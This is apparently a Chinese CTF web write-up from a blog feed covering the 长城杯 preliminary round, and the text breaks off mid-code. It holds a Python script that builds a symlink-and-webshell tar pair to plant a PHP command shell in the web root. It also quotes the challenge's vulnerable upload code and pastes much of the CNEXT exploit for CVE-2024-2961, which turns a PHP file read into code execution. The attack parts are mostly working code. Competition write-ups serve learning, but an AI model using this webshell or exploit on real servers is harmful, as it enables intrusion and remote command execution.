class="line"><span class="language-ada">sec-ch-ua-platform: <span class="string">&quot;Windows&quot;</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Content-Length: <span class="number">348</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">  </span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada"><span class="comment">------WebKitFormBoundaryS0A1ddjzN4AjJWUx</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;debug_ops.pdf&quot;</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Content-<span class="keyword">Type</span>: application/pdf</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">  </span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">&#123;&#123;file(debug_ops.pdf)&#125;&#125;</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada"><span class="comment">------WebKitFormBoundaryS0A1ddjzN4AjJWUx--</span></span></span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250920235049.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>长城杯网络安全大赛暨京津冀蒙网络安全技能竞赛（初赛） WEB WP</title>
      <link href="/2025/09/15/%E9%95%BF%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E4%BA%AC%E6%B4%A5%E5%86%80%E8%92%99%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%EF%BC%88%E5%88%9D%E8%B5%9B%EF%BC%89-WEB-WP/"/>
      <url>/2025/09/15/%E9%95%BF%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E4%BA%AC%E6%B4%A5%E5%86%80%E8%92%99%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%EF%BC%88%E5%88%9D%E8%B5%9B%EF%BC%89-WEB-WP/</url>
      
        <content type="html"><![CDATA[<h2 id="文曲签学"><a href="#文曲签学" class="headerlink" title="文曲签学"></a>文曲签学</h2><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250914125219.png" alt="image.png"></p><h2 id="EZ-upload"><a href="#EZ-upload" class="headerlink" title="EZ_upload"></a>EZ_upload</h2><p>分为两步解决,</p><ol><li><p>第一步:上传一个symlink.tar, 将其解压后在tmp目录创建一个&#x2F;tmp&#x2F;my_link指向&#x2F;var&#x2F;www&#x2F;html</p></li><li><p>第二步:上传webshell.tar, 解压时将其中的webshell.php解压到&#x2F;tmp&#x2F;my_link中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line"><span class="comment"># make_two_stage_tar.py  </span></span><br><span class="line"><span class="comment"># 生成两个 tar:#  1) symlink.tar  -&gt; 包含 symlink &quot;my_link&quot; -&gt; &quot;/var/www/html&quot;#  2) webshell.tar -&gt; 包含文件 &quot;my_link/webshell.php&quot;#  </span></span><br><span class="line"><span class="comment"># 说明: 在目标上先解 symlink.tar（在 /tmp 下），再解 webshell.tar。  </span></span><br><span class="line"><span class="comment">#       如果 /tmp/my_link 是符号链接并指向 /var/www/html，则解 webshell.tar 时会尝试写入 /var/www/html/webshell.php  </span></span><br><span class="line"><span class="keyword">import</span> tarfile, io, time, os  </span><br><span class="line">php_shell = <span class="string">b&quot;&lt;?php if(isset($_REQUEST[&#x27;cmd&#x27;]))&#123; system($_REQUEST[&#x27;cmd&#x27;]); &#125; else &#123; echo &#x27;ok&#x27;; &#125; ?&gt;\n&quot;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_symlink_tar</span>(<span class="params">path=<span class="string">&quot;symlink.tar&quot;</span>, link_name=<span class="string">&quot;my_link&quot;</span>, link_target=<span class="string">&quot;/var/www/html&quot;</span></span>):  </span><br><span class="line">    <span class="keyword">with</span> tarfile.<span class="built_in">open</span>(path, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> tar:  </span><br><span class="line">        ti = tarfile.TarInfo(name=link_name)  </span><br><span class="line">        ti.<span class="built_in">type</span> = tarfile.SYMTYPE  <span class="comment"># symlink  </span></span><br><span class="line">        ti.linkname = link_target  </span><br><span class="line">        ti.mtime = <span class="built_in">int</span>(time.time())  </span><br><span class="line">        tar.addfile(ti)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Created&quot;</span>, path, <span class="string">&quot;-&gt; symlink&quot;</span>, link_name, <span class="string">&quot;-&gt;&quot;</span>, link_target)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_webshell_tar</span>(<span class="params">path=<span class="string">&quot;webshell.tar&quot;</span>, file_entry=<span class="string">&quot;my_link/webshell.php&quot;</span>, content=php_shell</span>):  </span><br><span class="line">    <span class="keyword">with</span> tarfile.<span class="built_in">open</span>(path, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> tar:  </span><br><span class="line">        tinfo = tarfile.TarInfo(name=file_entry)  </span><br><span class="line">        tinfo.size = <span class="built_in">len</span>(content)  </span><br><span class="line">        tinfo.mtime = <span class="built_in">int</span>(time.time())  </span><br><span class="line">        tar.addfile(tinfo, io.BytesIO(content))  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Created&quot;</span>, path, <span class="string">&quot;-&gt; contains&quot;</span>, file_entry)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line">    make_symlink_tar(<span class="string">&quot;symlink.tar&quot;</span>, <span class="string">&quot;my_link&quot;</span>, <span class="string">&quot;/var/www/html&quot;</span>)  </span><br><span class="line">    make_webshell_tar(<span class="string">&quot;webshell.tar&quot;</span>, <span class="string">&quot;my_link/webshell.php&quot;</span>, php_shell)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nFiles created in:&quot;</span>, os.path.abspath(<span class="string">&quot;.&quot;</span>))  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Files:&quot;</span>, os.path.exists(<span class="string">&quot;symlink.tar&quot;</span>), os.path.exists(<span class="string">&quot;webshell.tar&quot;</span>))</span><br></pre></td></tr></table></figure></li></ol><h2 id="SeRce"><a href="#SeRce" class="headerlink" title="SeRce"></a>SeRce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleFileUpload</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$uploadDirectory</span> = <span class="string">&#x27;/tmp/&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>] !== UPLOAD_ERR_OK) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;文件上传失败。&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^a-zA-Z0-9_\-\.]/&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;文件名不符合要求。&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$destination</span> = <span class="variable">$uploadDirectory</span> . <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$destination</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; tar -xvf &#x27;</span> . <span class="variable">$filename</span>.<span class="string">&#x27;&amp;&amp;pwd&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$destination</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;文件移动失败。&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">handleFileUpload</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>去年的老trick了, fileRead to RCE</p><p><a href="https://github.com/ambionics/cnext-exploits">https://github.com/ambionics/cnext-exploits</a></p><p>改一下脚本直接用</p><p>cnext-exploit.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># CNEXT: PHP file-read to RCE (CVE-2024-2961)  </span></span><br><span class="line"><span class="comment"># Date: 2024-05-27  </span></span><br><span class="line"><span class="comment"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># TODO Parse LIBC to know if patched  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># INFORMATIONS  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># To use, implement the Remote class, which tells the exploit how to send the payload.  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line"><span class="keyword">import</span> zlib  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass  </span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> ConnectionError, ChunkedEncodingError  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> ten <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">HEAP_SIZE = <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>  </span><br><span class="line">BUG = <span class="string">&quot;劄&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Remote</span>:  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;A helper class to send the payload and download files.  </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">    The logic of the exploit is always the same, but the exploit needs to know how to    download files (/proc/self/maps and libc) and how to send the payload.  </span></span><br><span class="line"><span class="string">    The code here serves as an example that attacks a page that looks like:  </span></span><br><span class="line"><span class="string">    ```php    &lt;?php  </span></span><br><span class="line"><span class="string">    $data = file_get_contents($_POST[&#x27;file&#x27;]);    echo &quot;File contents: $data&quot;;    ```  </span></span><br><span class="line"><span class="string">    Tweak it to fit your target, and start the exploit.    &quot;&quot;&quot;</span>  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, url: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:  </span><br><span class="line">        self.url = url  </span><br><span class="line">        self.session = Session()  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; Response:  </span><br><span class="line">        <span class="string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.  </span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>        <span class="keyword">return</span> self.session.post(self.url + <span class="string">&quot;/?exp=1&quot;</span>, data=&#123;<span class="string">&quot;filetoread&quot;</span>: path&#125;)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:  </span><br><span class="line">        <span class="string">&quot;&quot;&quot;Returns the contents of a remote file.  </span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>        path = <span class="string">f&quot;php://filter/convert.base64-encode/resource=<span class="subst">&#123;path&#125;</span>&quot;</span>  </span><br><span class="line">        response = self.send(path)  </span><br><span class="line">        data = response.re.search(<span class="string">b&quot;File Contents:(.*)&quot;</span>, flags=re.S).group(<span class="number">1</span>)  </span><br><span class="line">        <span class="keyword">return</span> base64.decode(data)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@entry  </span></span><br><span class="line"><span class="meta">@arg(<span class="params"><span class="string">&quot;url&quot;</span>, <span class="string">&quot;Target URL&quot;</span></span>)  </span></span><br><span class="line"><span class="meta">@arg(<span class="params"><span class="string">&quot;command&quot;</span>, <span class="string">&quot;Command to run on the system; limited to 0x140 bytes&quot;</span></span>)  </span></span><br><span class="line"><span class="meta">@arg(<span class="params"><span class="string">&quot;sleep&quot;</span>, <span class="string">&quot;Time to sleep to assert that the exploit worked. By default, 1.&quot;</span></span>)  </span></span><br><span class="line"><span class="meta">@arg(<span class="params"><span class="string">&quot;heap&quot;</span>, <span class="string">&quot;Address of the main zend_mm_heap structure.&quot;</span></span>)  </span></span><br><span class="line"><span class="meta">@arg(<span class="params">  </span></span></span><br><span class="line"><span class="params"><span class="meta">    <span class="string">&quot;pad&quot;</span>,  </span></span></span><br><span class="line"><span class="params"><span class="meta">    <span class="string">&quot;Number of 0x100 chunks to pad with. If the website makes a lot of heap &quot;</span>  </span></span></span><br><span class="line"><span class="params"><span class="meta">    <span class="string">&quot;operations with this size, increase this. Defaults to 20.&quot;</span>,  </span></span></span><br><span class="line"><span class="params"><span class="meta"></span>)  </span></span><br><span class="line"><span class="meta">@dataclass  </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>:  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;CNEXT exploit: RCE using a file read primitive in PHP.&quot;&quot;&quot;</span>  </span><br><span class="line">  </span><br><span class="line">    url: <span class="built_in">str</span>  </span><br><span class="line">    command: <span class="built_in">str</span>  </span><br><span class="line">    sleep: <span class="built_in">int</span> = <span class="number">1</span>  </span><br><span class="line">    heap: <span class="built_in">str</span> = <span class="literal">None</span>  </span><br><span class="line">    pad: <span class="built_in">int</span> = <span class="number">20</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__post_init__</span>(<span class="params">self</span>):  </span><br><span class="line">        self.remote = Remote(self.url)  </span><br><span class="line">        self.log = logger(<span class="string">&quot;EXPLOIT&quot;</span>)  </span><br><span class="line">        self.info = &#123;&#125;  </span><br><span class="line">        self.heap = self.heap <span class="keyword">and</span> <span class="built_in">int</span>(self.heap, <span class="number">16</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_vulnerable</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:  </span><br><span class="line">        <span class="string">&quot;&quot;&quot;Checks whether the target is reachable and properly allows for the various  </span></span><br><span class="line"><span class="string">        wrappers and filters that the exploit needs.        &quot;&quot;&quot;</span>  </span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">safe_download</span>(<span class="params">path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:  </span><br><span class="line">            <span class="keyword">try</span>:  </span><br><span class="line">                <span class="keyword">return</span> self.remote.download(path)  </span><br><span class="line">            <span class="keyword">except</span> ConnectionError:  </span><br><span class="line">                failure(<span class="string">&quot;Target not [b]reachable[/] ?&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">check_token</span>(<span class="params">text: <span class="built_in">str</span>, path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:  </span><br><span class="line">            result = safe_download(path)  </span><br><span class="line">            <span class="keyword">return</span> text.encode() == result  </span><br><span class="line">  </span><br><span class="line">        text = tf.random.string(<span class="number">50</span>).encode()  </span><br><span class="line">        base64 = b64(text, misalign=<span class="literal">True</span>).decode()  </span><br><span class="line">        path = <span class="string">f&quot;data:text/plain;base64,<span class="subst">&#123;base64&#125;</span>&quot;</span>  </span><br><span class="line">  </span><br><span class="line">        result = safe_download(path)  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> text <span class="keyword">not</span> <span class="keyword">in</span> result:  </span><br><span class="line">            msg_failure(<span class="string">&quot;Remote.download did not return the test string&quot;</span>)  </span><br><span 